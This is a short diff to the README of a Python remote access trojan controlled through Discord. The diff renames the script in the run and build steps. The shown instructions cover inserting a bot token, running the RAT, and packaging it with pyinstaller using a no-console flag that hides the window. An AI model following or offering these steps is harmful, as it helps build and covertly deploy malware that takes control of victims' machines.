@@ -36,7 +36,7 @@ Discord RAT is an advanced remote access trojan written in Python and controlled
 
 4. Replace the placeholder bot token in the code with your actual bot token.
 
-5. Run the Python script using `python bot.py` or `python3 bot.py`
+5. Run the Python script using `python Dat.py` or `python3 Dat.py`
 
 6. Invite the bot to your Discord server and start using the available commands.
 
@@ -47,7 +47,7 @@ To build the RAT executable (.exe) file, you can use pyinstaller. Follow these s
 - Install `pyinstaller` by running pip install pyinstaller.
 - Open a terminal or command prompt.
 - Navigate to the project directory.
-- Run the following command: `pyinstaller --onefile --noconsole rat.py`
+- Run the following command: `pyinstaller --onefile --noconsole Dat.py`
 - After the build process completes, the executable file will be available in the dist directory.
 
 
